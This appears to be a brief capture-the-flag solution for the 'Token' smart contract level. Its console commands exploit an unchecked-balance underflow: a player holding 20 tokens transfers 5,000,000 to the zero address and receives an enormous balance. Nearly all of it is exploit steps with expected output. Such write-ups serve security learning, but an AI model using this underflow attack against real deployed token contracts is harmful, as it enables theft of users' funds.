token

// total token supply is 21,000,000

```javascript
player // => returns player's address
await contract.balanceOf(player) // => should return 20 [tokens]
await contract.totalSupply.call() // => 21000000 tokens in contract
await contract.transfer("0x0",5000000) // send any amount since no condition exists that checks if balance of account is less than the amount trying to send
await contract.balanceOf(player) // => should return enormous amount of tokens)
```
